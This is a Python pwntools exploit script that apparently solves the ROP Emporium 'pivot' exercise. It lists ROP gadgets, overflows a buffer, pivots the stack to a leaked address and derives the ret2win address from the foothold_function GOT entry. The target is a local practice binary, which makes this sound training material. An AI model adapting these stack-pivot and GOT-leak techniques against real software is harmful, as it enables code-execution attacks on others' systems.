from pwn import *
import re

#0x0000000000400b00 : pop rax ; ret
#0x0000000000400b02 : xchg rax, rsp ; ret
#0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
#0x0000000000400900 : pop rbp ; ret
#0x0000000000400b09 : add rax, rbp ; ret
#0x000000000040098e : call rax

CALL_RAX=0x0040098e
SET_RAX=0x00400b00
SET_RBP=0x00400900
ADD_RAX_RBP=0x00400b09
READ_AT_RAX=0x00400b05
PIVOT=0x00400b02
GOT_FOOTHOLD=0x00602048
PLT_FOOTHOLD=0x00400850

r=process("./pivot")
output=r.recvuntil(b"Send your")
pivot_addr=re.findall('pivot.{16}',output.decode())[1][7:]
pivot_addr=int(pivot_addr,16)

##########
#STAGE1:
##########
stage1=b'A'*40
stage1+=p64(SET_RAX) # set rax to the desired pivot addr(from the binary output)
stage1+=p64(pivot_addr)
stage1+=p64(PIVOT) # xchg rax,rsp
##########
#STAGE2:
##########
stage2=p64(PLT_FOOTHOLD) # call foothold function to populate the GOT
stage2+=p64(SET_RAX)
stage2+=p64(GOT_FOOTHOLD)
stage2+=p64(READ_AT_RAX)#get addr of foothold function to rax
stage2+=p64(SET_RBP)
stage2+=p64(0x14e) # add ret2win offset
stage2+=p64(ADD_RAX_RBP)
stage2+=p64(CALL_RAX) # call ret2win


r.sendline(stage2)
r.sendline(stage1)

r.interactive()
